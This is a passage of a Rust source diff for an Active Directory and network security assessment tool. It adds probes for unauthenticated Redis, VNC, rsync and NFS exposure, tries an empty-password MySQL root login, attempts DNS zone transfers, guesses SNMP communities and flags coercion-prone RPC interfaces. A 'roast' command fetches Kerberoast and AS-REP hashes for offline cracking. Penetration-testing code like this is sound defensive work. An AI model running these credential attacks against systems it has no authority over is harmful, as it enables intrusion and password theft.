+    use tokio::io::AsyncWriteExt;
+    let mut s = connect(host, 6379).await?;
+    s.write_all(b"INFO\r\n").await.ok()?;
+    let mut buf = [0u8; 512];
+    let n = read_some(&mut s, &mut buf).await;
+    String::from_utf8_lossy(&buf[..n])
+        .contains("redis_version")
+        .then(|| "REDIS: UNAUTHENTICATED (no AUTH required)".to_string())
+}
+
+/// EPM (135): report which attack-relevant RPC interfaces are registered on the endpoint mapper.
+async fn rpc_surface(host: &str) -> Option<String> {
+    use adhammer_dcerpc::{epm, Syntax};
+    let ifaces = [
+        (
+            "e3514235-4b06-11d1-ab04-00c04fc2dcd2",
+            4u16,
+            0u16,
+            "DRSUAPI(dcsync)",
+        ),
+        ("367abb81-9844-35f1-ad32-98f038001003", 2, 0, "SVCCTL(exec)"),
+        ("86d35949-83c9-4044-b424-db363231fd0c", 1, 0, "TSCH(exec)"),
+        (
+            "338cd001-2244-31f1-aaaa-900038001003",
+            1,
+            0,
+            "RemoteRegistry",
+        ),
+        (
+            "c681d488-d850-11d0-8c52-00c04fd90f7e",
+            1,
+            0,
+            "EFSR(petitpotam)",
+        ),
+        (
+            "12345678-1234-abcd-ef00-0123456789ab",
+            1,
+            0,
+            "RPRN(printerbug)",
+        ),
+    ];
+    let mut found = Vec::new();
+    for (uuid, maj, min, name) in ifaces {
+        if epm::resolve_port(host, Syntax::new(uuid, maj, min))
+            .await
+            .is_ok()
+        {
+            found.push(name);
+        }
+    }
+    (!found.is_empty()).then(|| format!("RPC/EPM registered: {}", found.join(", ")))
+}
+
+/// VNC (5900): RFB handshake — flag if security-type None (no auth) is offered.
+async fn vnc_noauth(host: &str) -> Option<String> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let mut s = connect(host, 5900).await?;
+    let mut ver = [0u8; 12];
+    tokio::time::timeout(
+        std::time::Duration::from_millis(900),
+        s.read_exact(&mut ver),
+    )
+    .await
+    .ok()?
+    .ok()?;
+    if &ver[0..3] != b"RFB" {
+        return None;
+    }
+    s.write_all(&ver).await.ok()?; // accept the server's protocol version
+    let mut buf = [0u8; 64];
+    let n = read_some(&mut s, &mut buf).await;
+    let v = String::from_utf8_lossy(&ver).trim().to_string();
+    if n >= 2 {
+        let count = buf[0] as usize;
+        if buf[1..(1 + count).min(n)].contains(&1) {
+            return Some(format!("VNC ({v}): NO AUTH (security-type None offered)"));
+        }
+        return Some(format!("VNC ({v}): auth required"));
+    }
+    None
+}
+
+/// WinRM (5985/5986): probe /wsman and report the offered HTTP auth methods.
+async fn winrm_probe(host: &str, port: u16) -> Option<String> {
+    use tokio::io::AsyncWriteExt;
+    let mut s = connect(host, port).await?;
+    let req = format!("POST /wsman HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/soap+xml;charset=UTF-8\r\nContent-Length: 0\r\n\r\n");
+    s.write_all(req.as_bytes()).await.ok()?;
+    let mut buf = [0u8; 1024];
+    let n = read_some(&mut s, &mut buf).await;
+    let r = String::from_utf8_lossy(&buf[..n]);
+    if r.contains(" 401") {
+        let mut m = Vec::new();
+        for a in ["Negotiate", "NTLM", "Kerberos", "Basic"] {
+            if r.contains(a) {
+                m.push(a);
+            }
+        }
+        Some(format!(
+            "WinRM: enabled (auth: {})",
+            if m.is_empty() {
+                "unknown".into()
+            } else {
+                m.join("/")
+            }
+        ))
+    } else {
+        r.contains("HTTP/1.")
+            .then(|| "WinRM: HTTP responding".to_string())
+    }
+}
+
+/// Rsync (873): speak the rsyncd greeting and list modules — a blank module name asks the
+/// daemon to enumerate everything it exports (classic anonymous-rsync exposure).
+async fn rsync_modules(host: &str) -> Option<String> {
+    use tokio::io::AsyncWriteExt;
+    let mut s = connect(host, 873).await?;
+    let mut buf = [0u8; 1024];
+    let n = read_some(&mut s, &mut buf).await; // "@RSYNCD: <ver>\n"
+    let greet = String::from_utf8_lossy(&buf[..n]);
+    let ver = greet.strip_prefix("@RSYNCD:").map(|v| v.trim())?;
+    // Echo the version back, then send an empty module name to request the module list.
+    s.write_all(format!("@RSYNCD: {ver}\n").as_bytes())
+        .await
+        .ok()?;
+    s.write_all(b"\n").await.ok()?;
+    let n = read_some(&mut s, &mut buf).await;
+    let body = String::from_utf8_lossy(&buf[..n]);
+    let mods: Vec<&str> = body
+        .lines()
+        .map(str::trim)
+        .filter(|l| !l.is_empty() && !l.starts_with("@RSYNCD"))
+        .map(|l| l.split_whitespace().next().unwrap_or(l))
+        .collect();
+    if mods.is_empty() {
+        Some("RSYNC: daemon reachable (no anonymous modules listed)".to_string())
+    } else {
+        Some(format!(
+            "RSYNC: {} module(s) exported: {}",
+            mods.len(),
+            mods.join(", ")
+        ))
+    }
+}
+
+/// MySQL (3306): parse the initial handshake for the server version, then test an
+/// empty-password `root` login — a real credential finding, consistent with the other
+/// deep checks (FTP anon / Redis unauth).
+async fn mysql_probe(host: &str) -> Option<String> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let mut s = connect(host, 3306).await?;
+    // --- read the server's initial HandshakeV10 packet ---
+    let mut hdr = [0u8; 4];
+    tokio::time::timeout(
+        std::time::Duration::from_millis(1000),
+        s.read_exact(&mut hdr),
+    )
+    .await
+    .ok()?
+    .ok()?;
+    let plen = (hdr[0] as usize) | (hdr[1] as usize) << 8 | (hdr[2] as usize) << 16;
+    if !(1..=1024).contains(&plen) {
+        return None;
+    }
+    let mut pkt = vec![0u8; plen];
+    s.read_exact(&mut pkt).await.ok()?;
+    if pkt.first() != Some(&10) {
+        // Not protocol 10 — could be an ERR (e.g. host not allowed). Report what we can.
+        if pkt.first() == Some(&0xff) {
+            return Some("MySQL: reachable, host-not-allowed / access denied".to_string());
+        }
+        return Some("MySQL: reachable (unrecognized handshake)".to_string());
+    }
+    let ver_end = pkt[1..].iter().position(|&b| b == 0).map(|p| p + 1)?;
+    let version = String::from_utf8_lossy(&pkt[1..ver_end]).to_string();
+
+    // --- HandshakeResponse41: user root, empty auth, native-password plugin ---
+    let mut body = Vec::new();
+    body.extend_from_slice(&0x0008_8201u32.to_le_bytes()); // LONG_PASSWORD|PROTOCOL_41|SECURE_CONNECTION|PLUGIN_AUTH
+    body.extend_from_slice(&0x0100_0000u32.to_le_bytes()); // max packet 16M
+    body.push(0x21); // charset utf8
+    body.extend_from_slice(&[0u8; 23]); // reserved
+    body.extend_from_slice(b"root\0");
+    body.push(0x00); // auth-response length = 0 (empty password)
+    body.extend_from_slice(b"mysql_native_password\0");
+    let mut resp = vec![
+        body.len() as u8,
+        (body.len() >> 8) as u8,
+        (body.len() >> 16) as u8,
+        1,
+    ];
+    resp.extend_from_slice(&body);
+    s.write_all(&resp).await.ok()?;
+
+    // --- read the auth result ---
+    let mut rh = [0u8; 4];
+    if s.read_exact(&mut rh).await.is_err() {
+        return Some(format!(
+            "MySQL {version}: handshake parsed (login result unavailable)"
+        ));
+    }
+    let rlen = (rh[0] as usize) | (rh[1] as usize) << 8 | (rh[2] as usize) << 16;
+    let mut rp = vec![0u8; rlen.min(1024)];
+    let _ = s.read_exact(&mut rp).await;
+    match rp.first() {
+        Some(0x00) => Some(format!("MySQL {version}: EMPTY root PASSWORD ACCEPTED")),
+        Some(0x01) if rp.get(1) == Some(&0x03) => Some(format!(
+            "MySQL {version}: EMPTY root PASSWORD ACCEPTED (caching_sha2 fast-auth)"
+        )),
+        _ => Some(format!(
+            "MySQL {version}: auth required (root/empty rejected)"
+        )),
+    }
+}
+
+/// MSSQL (1433): TDS PRELOGIN handshake — reports the SQL Server version and whether transport
+/// encryption is enforced (ENCRYPT_OFF/NOT_SUP = credentials cross the wire in cleartext).
+async fn mssql_prelogin(host: &str) -> Option<String> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let mut s = connect(host, 1433).await?;
+    // PRELOGIN options: VERSION(0x00,6) ENCRYPTION(0x01,1) TERMINATOR(0xff), then the data.
+    let mut opts = Vec::new();
+    let data_start = 3 * 2 + 1; // two 5-byte option entries + 1 terminator
+    opts.extend_from_slice(&[0x00, 0x00, data_start as u8, 0x00, 0x06]); // VERSION @ +0, len 6
+    opts.extend_from_slice(&[0x01, 0x00, (data_start + 6) as u8, 0x00, 0x01]); // ENCRYPTION, len 1
+    opts.push(0xff); // terminator
+    opts.extend_from_slice(&[0u8; 6]); // VERSION data
+    opts.push(0x00); // ENCRYPT_OFF
+    let total = 8 + opts.len();
+    let mut pkt = vec![0x12, 0x01, (total >> 8) as u8, total as u8, 0, 0, 0, 0]; // TDS header (type PRELOGIN, EOM)
+    pkt.extend_from_slice(&opts);
+    s.write_all(&pkt).await.ok()?;
+
+    let mut hdr = [0u8; 8];
+    tokio::time::timeout(
+        std::time::Duration::from_millis(1000),
+        s.read_exact(&mut hdr),
+    )
+    .await
+    .ok()?
+    .ok()?;
+    if hdr[0] != 0x04 {
+        return Some("MSSQL: reachable (unexpected TDS response)".to_string());
+    }
+    let len = ((hdr[2] as usize) << 8 | hdr[3] as usize).saturating_sub(8);
+    let mut body = vec![0u8; len.min(512)];
+    if s.read_exact(&mut body).await.is_err() || body.len() < 5 {
+        return Some("MSSQL: TDS PRELOGIN responded".to_string());
+    }
+    let (version, enc) = parse_prelogin(&body);
+    let v = version.unwrap_or_else(|| "unknown".into());
+    let e = match enc {
+        Some(0x00) => "encryption OFF (login in cleartext)",
+        Some(0x02) => "encryption NOT SUPPORTED (login in cleartext)",
+        Some(0x01) => "encryption available",
+        Some(0x03) => "encryption REQUIRED",
+        _ => "encryption state unknown",
+    };
+    Some(format!("MSSQL {v}: {e}"))
+}
+
+/// Walk a TDS PRELOGIN option table for VERSION(0x00) → "maj.min.build" and ENCRYPTION(0x01).
+fn parse_prelogin(body: &[u8]) -> (Option<String>, Option<u8>) {
+    let (mut version, mut enc) = (None, None);
+    let mut i = 0;
+    while i + 5 <= body.len() && body[i] != 0xff {
+        let token = body[i];
+        let off = (body[i + 1] as usize) << 8 | body[i + 2] as usize;
+        let l = (body[i + 3] as usize) << 8 | body[i + 4] as usize;
+        if off + l <= body.len() {
+            let d = &body[off..off + l];
+            if token == 0x00 && l >= 4 {
+                version = Some(format!(
+                    "{}.{}.{}",
+                    d[0],
+                    d[1],
+                    (d[2] as u16) << 8 | d[3] as u16
+                ));
+            } else if token == 0x01 && l >= 1 {
+                enc = Some(d[0]);
+            }
+        }
+        i += 5;
+    }
+    (version, enc)
+}
+
+/// DNS (53): fingerprint via `version.bind` (CHAOS TXT) and, if a zone is supplied, attempt an
+/// AXFR zone transfer over TCP and report how many records the server leaked.
+async fn dns_check(host: &str, zone: Option<&str>) -> Option<String> {
+    let mut out = Vec::new();
+    if let Some(v) = dns_version_bind(host).await {
+        out.push(format!("version.bind={v}"));
+    }
+    if let Some(z) = zone {
+        match dns_axfr(host, z).await {
+            Some(count) if count > 0 => {
+                out.push(format!("AXFR OK for {z}: {count} records LEAKED"))
+            }
+            Some(_) => out.push(format!("AXFR refused for {z}")),
+            None => {}
+        }
+    }
+    (!out.is_empty()).then(|| format!("DNS: {}", out.join(" · ")))
+}
+
+/// CHAOS-class TXT query for `version.bind` over UDP — reveals the resolver software/version.
+async fn dns_version_bind(host: &str) -> Option<String> {
+    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
+    sock.connect((host, 53)).await.ok()?;
+    // Header: id, flags(RD), qd=1; Question: version.bind TXT CH.
+    let mut q = vec![0x13, 0x37, 0x01, 0x00, 0, 1, 0, 0, 0, 0, 0, 0];
+    for label in ["version", "bind"] {
+        q.push(label.len() as u8);
+        q.extend_from_slice(label.as_bytes());
+    }
+    q.push(0);
+    q.extend_from_slice(&[0x00, 0x10, 0x00, 0x03]); // TXT, CHAOS
+    sock.send(&q).await.ok()?;
+    let mut buf = [0u8; 512];
+    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
+        .await
+        .ok()?
+        .ok()?;
+    // Grab the longest printable run in the answer section as the version string.
+    let ans = &buf[..n];
+    let mut best = String::new();
+    let mut cur = String::new();
+    for &b in &ans[12.min(n)..] {
+        if (0x20..0x7f).contains(&b) {
+            cur.push(b as char);
+        } else {
+            if cur.trim().len() > best.trim().len() {
+                best = cur.clone();
+            }
+            cur.clear();
+        }
+    }
+    if cur.trim().len() > best.trim().len() {
+        best = cur;
+    }
+    let best = best.trim().to_string();
+    (best.len() >= 3).then_some(best)
+}
+
+/// Attempt a full AXFR zone transfer over TCP/53. Returns the number of resource records
+/// returned (0 = server refused / not authoritative), or None if the query failed.
+async fn dns_axfr(host: &str, zone: &str) -> Option<usize> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    let mut s = connect(host, 53).await?;
+    let mut msg = vec![0x13, 0x38, 0x00, 0x00, 0, 1, 0, 0, 0, 0, 0, 0]; // no RD; AXFR is authoritative
+    for label in zone.split('.').filter(|l| !l.is_empty()) {
+        msg.push(label.len() as u8);
+        msg.extend_from_slice(label.as_bytes());
+    }
+    msg.push(0);
+    msg.extend_from_slice(&[0x00, 0xfc, 0x00, 0x01]); // QTYPE=AXFR(252), QCLASS=IN
+    let framed = [&(msg.len() as u16).to_be_bytes()[..], &msg].concat(); // TCP DNS 2-byte length prefix
+    s.write_all(&framed).await.ok()?;
+    // Read length-prefixed response messages until the connection closes or a short read.
+    let mut total_ancount = 0usize;
+    let mut got_any = false;
+    loop {
+        let mut len = [0u8; 2];
+        match tokio::time::timeout(
+            std::time::Duration::from_millis(1500),
+            s.read_exact(&mut len),
+        )
+        .await
+        {
+            Ok(Ok(_)) => {}
+            _ => break,
+        }
+        let n = u16::from_be_bytes(len) as usize;
+        if n < 12 {
+            break;
+        }
+        let mut buf = vec![0u8; n];
+        if s.read_exact(&mut buf).await.is_err() {
+            break;
+        }
+        got_any = true;
+        let rcode = buf[3] & 0x0f;
+        if rcode != 0 {
+            return Some(0); // REFUSED / NOTAUTH etc.
+        }
+        total_ancount += u16::from_be_bytes([buf[6], buf[7]]) as usize;
+        // AXFR ends when the closing SOA is returned; a single message with ANCOUNT is enough
+        // to conclude for our purposes, but keep reading in case it is chunked.
+        if total_ancount > 1 {
+            break;
+        }
+    }
+    got_any.then_some(total_ancount)
+}
+
+/// NFS (via portmap/111): GETPORT for the MOUNT program, then MOUNTPROC_EXPORT to list the
+/// exported shares — the `showmount -e` equivalent, a classic data-exposure finding.
+async fn nfs_showmount(host: &str) -> Option<String> {
+    use tokio::io::{AsyncReadExt, AsyncWriteExt};
+    // --- portmap GETPORT (prog 100000 v2 proc 3) for MOUNT (100005) v3 over TCP(6) ---
+    let mut s = connect(host, 111).await?;
+    let mut call = rpc_call(100000, 2, 3, 0x4841_4d31);
+    call.extend_from_slice(&100005u32.to_be_bytes()); // prog
+    call.extend_from_slice(&3u32.to_be_bytes()); // vers
+    call.extend_from_slice(&6u32.to_be_bytes()); // proto = TCP
+    call.extend_from_slice(&0u32.to_be_bytes()); // port (ignored)
+    s.write_all(&rpc_frame(&call)).await.ok()?;
+    let reply = rpc_recv(&mut s).await?;
+    let port = reply
+        .get(reply.len().saturating_sub(4)..)
+        .map(|b| u32::from_be_bytes(b.try_into().unwrap()))?;
+    if port == 0 || port > 65535 {
+        return Some("NFS: portmap up but MOUNT not registered".to_string());
+    }
+    // --- MOUNT EXPORT (prog 100005 v3 proc 5) on the resolved port ---
+    let mut m = connect(host, port as u16).await?;
+    let call = rpc_call(100005, 3, 5, 0x4841_4d32);
+    m.write_all(&rpc_frame(&call)).await.ok()?;
+    let mut buf = vec![0u8; 4096];
+    let n = tokio::time::timeout(std::time::Duration::from_millis(1200), m.read(&mut buf))
+        .await
+        .ok()?
+        .ok()?;
+    // The export list is a chain of (opaque dirpath, group list, next?) — pull the dirpath strings.
+    let exports = parse_exports(&buf[..n.min(buf.len())]);
+    if exports.is_empty() {
+        Some(format!(
+            "NFS: MOUNT on :{port} (no exports listed / access denied)"
+        ))
+    } else {
+        Some(format!(
+            "NFS: {} export(s): {}",
+            exports.len(),
+            exports.join(", ")
+        ))
+    }
+}
+
+/// Build an ONC RPC v2 CALL header with AUTH_NULL creds/verifier for the given program.
+fn rpc_call(prog: u32, vers: u32, proc_: u32, xid: u32) -> Vec<u8> {
+    let mut b = Vec::new();
+    b.extend_from_slice(&xid.to_be_bytes());
+    b.extend_from_slice(&0u32.to_be_bytes()); // msg_type = CALL
+    b.extend_from_slice(&2u32.to_be_bytes()); // rpcvers
+    b.extend_from_slice(&prog.to_be_bytes());
+    b.extend_from_slice(&vers.to_be_bytes());
+    b.extend_from_slice(&proc_.to_be_bytes());
+    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // cred: AUTH_NULL, len 0
+    b.extend_from_slice(&[0, 0, 0, 0, 0, 0, 0, 0]); // verf: AUTH_NULL, len 0
+    b
+}
+
+/// Wrap an RPC message in a single last-fragment record marker (TCP transport).
+fn rpc_frame(msg: &[u8]) -> Vec<u8> {
+    let marker = 0x8000_0000u32 | (msg.len() as u32);
+    [&marker.to_be_bytes()[..], msg].concat()
+}
+
+/// Read one record-marked RPC reply and return the payload after the 24-byte accepted-reply head.
+async fn rpc_recv(s: &mut tokio::net::TcpStream) -> Option<Vec<u8>> {
+    use tokio::io::AsyncReadExt;
+    let mut m = [0u8; 4];
+    tokio::time::timeout(std::time::Duration::from_millis(1200), s.read_exact(&mut m))
+        .await
+        .ok()?
+        .ok()?;
+    let len = (u32::from_be_bytes(m) & 0x7fff_ffff) as usize;
+    if !(4..=65536).contains(&len) {
+        return None;
+    }
+    let mut buf = vec![0u8; len];
+    s.read_exact(&mut buf).await.ok()?;
+    Some(buf)
+}
+
+/// Parse a MOUNTPROC_EXPORT reply body into export path strings (best-effort XDR walk).
+fn parse_exports(body: &[u8]) -> Vec<String> {
+    let mut out = Vec::new();
+    let mut i = 24usize.min(body.len()); // skip RPC accepted-reply header
+    while i + 4 <= body.len() {
+        let more = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
+        i += 4;
+        if more != 1 {
+            break; // 0 = end of export list
+        }
+        if i + 4 > body.len() {
+            break;
+        }
+        let dlen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
+        i += 4;
+        if dlen == 0 || dlen > 1024 || i + dlen > body.len() {
+            break;
+        }
+        out.push(String::from_utf8_lossy(&body[i..i + dlen]).to_string());
+        i += (dlen + 3) & !3; // XDR 4-byte alignment
+                              // Skip the group list attached to this export.
+        while i + 4 <= body.len() {
+            let g = u32::from_be_bytes(body[i..i + 4].try_into().unwrap());
+            i += 4;
+            if g != 1 {
+                break;
+            }
+            if i + 4 > body.len() {
+                break;
+            }
+            let glen = u32::from_be_bytes(body[i..i + 4].try_into().unwrap()) as usize;
+            i += 4 + ((glen + 3) & !3);
+        }
+    }
+    out
+}
+
+/// SNMP (UDP/161): GET sysDescr.0 with each community string; a valid reply means the community
+/// is accepted (read access to the whole MIB) — reports the community and the system descriptor.
+async fn snmp_public(host: &str, communities: &str) -> Option<String> {
+    for community in communities
+        .split(',')
+        .map(str::trim)
+        .filter(|c| !c.is_empty())
+    {
+        if let Some(desc) = snmp_get_sysdescr(host, community).await {
+            let d = desc.chars().take(60).collect::<String>();
+            return Some(format!("SNMP: community '{community}' VALID → {d}"));
+        }
+    }
+    None
+}
+
+/// One SNMPv1 GetRequest for sysDescr.0 (1.3.6.1.2.1.1.1.0); returns the descriptor if accepted.
+async fn snmp_get_sysdescr(host: &str, community: &str) -> Option<String> {
+    let sock = tokio::net::UdpSocket::bind("0.0.0.0:0").await.ok()?;
+    sock.connect((host, 161)).await.ok()?;
+    let oid = [0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]; // 1.3.6.1.2.1.1.1.0
+    let varbind = ber_seq(&[ber(0x06, &oid), ber(0x05, &[])].concat()); // OID + NULL
+    let varbinds = ber_seq(&varbind);
+    let pdu_body = [
+        ber(0x02, &[0x2a]), // request-id
+        ber(0x02, &[0x00]), // error-status
+        ber(0x02, &[0x00]), // error-index
+        varbinds,
+    ]
+    .concat();
+    let pdu = ber(0xa0, &pdu_body); // GetRequest
+    let msg = ber_seq(
+        &[
+            ber(0x02, &[0x00]),              // version = 0 (v1)
+            ber(0x04, community.as_bytes()), // community
+            pdu,
+        ]
+        .concat(),
+    );
+    sock.send(&msg).await.ok()?;
+    let mut buf = [0u8; 1500];
+    let n = tokio::time::timeout(std::time::Duration::from_millis(900), sock.recv(&mut buf))
+        .await
+        .ok()?
+        .ok()?;
+    // Any well-formed SEQUENCE reply means the community was accepted; pull the sysDescr string.
+    let resp = &buf[..n];
+    if resp.first() != Some(&0x30) {
+        return None;
+    }
+    Some(snmp_first_octet_string(resp).unwrap_or_else(|| "(accepted)".to_string()))
+}
+
+/// Minimal BER: definite-length TLV (lengths < 65536).
+fn ber(tag: u8, val: &[u8]) -> Vec<u8> {
+    let mut out = vec![tag];
+    let len = val.len();
+    if len < 0x80 {
+        out.push(len as u8);
+    } else if len < 0x100 {
+        out.extend_from_slice(&[0x81, len as u8]);
+    } else {
+        out.extend_from_slice(&[0x82, (len >> 8) as u8, len as u8]);
+    }
+    out.extend_from_slice(val);
+    out
+}
+fn ber_seq(val: &[u8]) -> Vec<u8> {
+    ber(0x30, val)
+}
+
+/// Walk BER and return the last printable OCTET STRING value — the sysDescr in an SNMP reply.
+fn snmp_first_octet_string(buf: &[u8]) -> Option<String> {
+    let mut i = 0;
+    let mut best: Option<String> = None;
+    while i + 2 <= buf.len() {
+        let tag = buf[i];
+        let mut len = buf[i + 1] as usize;
+        let mut hdr = 2;
+        if len == 0x81 && i + 2 < buf.len() {
+            len = buf[i + 2] as usize;
+            hdr = 3;
+        } else if len == 0x82 && i + 3 < buf.len() {
+            len = ((buf[i + 2] as usize) << 8) | buf[i + 3] as usize;
+            hdr = 4;
+        }
+        if tag == 0x30 || tag == 0xa0 || tag == 0xa2 {
+            i += hdr; // descend into constructed types
+            continue;
+        }
+        if i + hdr + len > buf.len() {
+            break;
+        }
+        if tag == 0x04 && len >= 4 {
+            let v = &buf[i + hdr..i + hdr + len];
+            if v.iter().all(|&b| (0x20..0x7f).contains(&b)) {
+                best = Some(String::from_utf8_lossy(v).to_string());
+            }
+        }
+        i += hdr + len;
+    }
+    best
+}
+
+/// Expand a target spec: `@file` (one host/line), `a.b.c.d/nn` CIDR, or a comma list.
+fn expand_targets(spec: &str) -> Result<Vec<String>> {
+    if let Some(file) = spec.strip_prefix('@') {
+        let content = std::fs::read_to_string(file).context("read targets file")?;
+        return Ok(content
+            .lines()
+            .map(|l| l.trim().to_string())
+            .filter(|l| !l.is_empty())
+            .collect());
+    }
+    if spec.contains('/') {
+        let (base, prefix) = spec.split_once('/').unwrap();
+        let ip: std::net::Ipv4Addr = base.parse().context("bad CIDR address")?;
+        let prefix: u32 = prefix.parse().context("bad CIDR prefix")?;
+        anyhow::ensure!((8..=32).contains(&prefix), "CIDR prefix must be 8..=32");
+        let host_bits = 32 - prefix;
+        let size = if host_bits == 0 {
+            1u32
+        } else {
+            1u32 << host_bits
+        };
+        let mask = if host_bits == 0 {
+            u32::MAX
+        } else {
+            !(size - 1)
+        };
+        let net = u32::from(ip) & mask;
+        // Skip network + broadcast addresses for blocks with room for them.
+        let (start, end) = if prefix <= 30 {
+            (1, size - 1)
+        } else {
+            (0, size)
+        };
+        return Ok((start..end)
+            .map(|i| std::net::Ipv4Addr::from(net + i).to_string())
+            .collect());
+    }
+    Ok(spec
+        .split(',')
+        .map(|s| s.trim().to_string())
+        .filter(|s| !s.is_empty())
+        .collect())
+}
+
+fn config(a: &ScanArgs) -> LdapConfig {
+    LdapConfig {
+        url: a.url.clone(),
+        bind_dn: a.user.clone(),
+        password: a.password.clone(),
+        base_dn: a.base_dn.clone(),
+        insecure: a.insecure,
+        gssapi: a.gssapi,
+    }
+}
+
+async fn scan(a: ScanArgs) -> Result<()> {
+    let snap = Collector::connect(&config(&a)).await?.collect().await?;
+    tracing::info!(objects = snap.objects.len(), "collected");
+
+    let graph = ControlGraph::build(&snap);
+    let stats = graph.stats();
+    let paths = graph.paths_to_tier0();
+    let mut findings = adhammer_checks::run_all(&snap, &graph);
+
+    // Optional BloodHound export (SharpHound-compatible .zip) alongside the report.
+    if let Some(path) = &a.bloodhound {
+        let p = std::path::Path::new(path);
+        let n = adhammer_bloodhound::export_zip(&snap, p)?;
+        eprintln!("[+] BloodHound export: {} JSON files → {}", n, p.display());
+    }
+
+    // Optional SYSVOL sweep: GPP cpasswords (MS14-025) + default-policy signing/NTLM.
+    if let Some(sysvol) = &a.sysvol {
+        let root = std::path::Path::new(sysvol);
+        let hits = adhammer_sysvol::scan(root);
+        tracing::info!(gpp = hits.len(), "sysvol GPP swept");
+        if let Some(f) = adhammer_sysvol::finding(&hits) {
+            findings.insert(0, f);
+        }
+        let policy = adhammer_sysvol::gptmpl::scan_policy(root);
+        findings.extend(adhammer_sysvol::gptmpl::policy_findings(&policy));
+    }
+
+    let report = Report::build(
+        &snap.domain.domain_dn,
+        findings,
+        paths,
+        stats,
+        &RiskConfig::default(),
+    );
+
+    match a.format.as_str() {
+        "html" => println!("{}", report.to_html()),
+        _ => println!("{}", report.to_json()),
+    }
+    Ok(())
+}
+
+async fn roast(a: ScanArgs) -> Result<()> {
+    let snap = Collector::connect(&config(&a)).await?.collect().await?;
+    let realm = snap
+        .domain
+        .domain_dn
+        .split(',')
+        .filter_map(|p| p.strip_prefix("DC="))
+        .collect::<Vec<_>>()
+        .join(".")
+        .to_uppercase();
+    let (kerberoast, asrep) = adhammer_kerberos::candidates(&snap, &realm);
+
+    println!("== Kerberoastable ({}) ==", kerberoast.len());
+    match &a.kdc {
+        None => {
+            for c in &kerberoast {
+                println!("  {}  spn={}", c.sam, c.spn.as_deref().unwrap_or("-"));
+            }
+        }
+        Some(kdc) if !kerberoast.is_empty() => {
+            // One authenticated TGT, then a TGS-REQ per SPN.
+            match adhammer_kerberos::get_tgt(&a.user, &a.password, &realm, kdc).await {
+                Err(e) => eprintln!("  TGT acquisition failed: {e}"),
+                Ok(tgt) => {
+                    for c in &kerberoast {
+                        let spn = c.spn.as_deref().unwrap_or_default();
+                        match adhammer_kerberos::roast_spn(&tgt, &c.sam, spn, kdc).await {
+                            Ok(hash) => println!("{hash}"),
+                            Err(e) => eprintln!("  {}: {e}", c.sam),
+                        }
+                    }
+                }
+            }
+        }
+        Some(_) => {}
+    }
+
+    println!("== AS-REP roastable ({}) ==", asrep.len());
+    match &a.kdc {
+        None => {
+            for c in &asrep {
+                println!("  {}", c.sam);
+            }
+            if !asrep.is_empty() {
+                eprintln!("(pass --kdc <host> to fetch hashcat 18200 hashes)");
+            }
+        }
+        Some(kdc) => {
+            for c in &asrep {
+                match adhammer_kerberos::asrep_roast(c, kdc).await {
+                    Ok(hash) => println!("{hash}"),
+                    Err(e) => eprintln!("  {}: {e}", c.sam),
+                }
+            }
+        }
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod net_tests {
+    use super::*;
+
+    #[test]
+    fn ber_lengths() {
+        assert_eq!(ber(0x02, &[0x2a]), vec![0x02, 0x01, 0x2a]);
+        let long = vec![0u8; 200];
+        let e = ber(0x04, &long);
+        assert_eq!(&e[..2], &[0x04, 0x81]); // 1-byte extended length
+        assert_eq!(e[2], 200);
+        let longer = vec![0u8; 300];
+        let e2 = ber(0x04, &longer);
+        assert_eq!(&e2[..2], &[0x04, 0x82]); // 2-byte extended length
+        assert_eq!(u16::from_be_bytes([e2[2], e2[3]]), 300);
+    }
+
+    #[test]
+    fn rpc_record_marker_last_fragment() {
+        let f = rpc_frame(&[1, 2, 3, 4]);
+        assert_eq!(u32::from_be_bytes([f[0], f[1], f[2], f[3]]), 0x8000_0004);
+        assert_eq!(&f[4..], &[1, 2, 3, 4]);
+    }
+
+    #[test]
+    fn snmp_extracts_last_octet_string() {
+        // Hand-build an SNMPv1 GetResponse and confirm the walker returns sysDescr, not community.
+        let oid = ber(0x06, &[0x2b, 0x06, 0x01, 0x02, 0x01, 0x01, 0x01, 0x00]);
+        let val = ber(0x04, b"Linux router 5.10");
+        let vb = ber_seq(&[ber_seq(&[oid, val].concat())].concat());
+        let pdu_body = [ber(0x02, &[0x2a]), ber(0x02, &[0]), ber(0x02, &[0]), vb].concat();
+        let pdu = ber(0xa2, &pdu_body); // GetResponse
+        let msg = ber_seq(&[ber(0x02, &[0]), ber(0x04, b"public"), pdu].concat());
+        assert_eq!(
+            snmp_first_octet_string(&msg).as_deref(),
+            Some("Linux router 5.10")
+        );
+    }
+
+    #[test]
+    fn parse_exports_walks_chain() {
+        fn be(v: u32) -> [u8; 4] {
+            v.to_be_bytes()
+        }
+        let mut body = vec![0u8; 24]; // RPC accepted-reply header
+                                      // export 1: "/data", no groups
+        body.extend_from_slice(&be(1));
+        body.extend_from_slice(&be(5));
+        body.extend_from_slice(b"/data\0\0\0"); // padded to 8
+        body.extend_from_slice(&be(0)); // group list end
+                                        // export 2: "/exports", one group "*"
+        body.extend_from_slice(&be(1));
+        body.extend_from_slice(&be(8));
+        body.extend_from_slice(b"/exports");
+        body.extend_from_slice(&be(1)); // group present
+        body.extend_from_slice(&be(1));
+        body.extend_from_slice(b"*\0\0\0");
+        body.extend_from_slice(&be(0)); // group list end
+        body.extend_from_slice(&be(0)); // export list end
+        let ex = parse_exports(&body);
+        assert_eq!(ex, vec!["/data".to_string(), "/exports".to_string()]);
+    }
+
+    /// Tiny deterministic PRNG (xorshift64*) so any fuzz failure reproduces from its seed.
+    struct Rng(u64);
+    impl Rng {
+        fn next(&mut self) -> u64 {
+            self.0 ^= self.0 >> 12;
+            self.0 ^= self.0 << 25;
+            self.0 ^= self.0 >> 27;
+            self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
+        }
+        fn bytes(&mut self, max: usize) -> Vec<u8> {
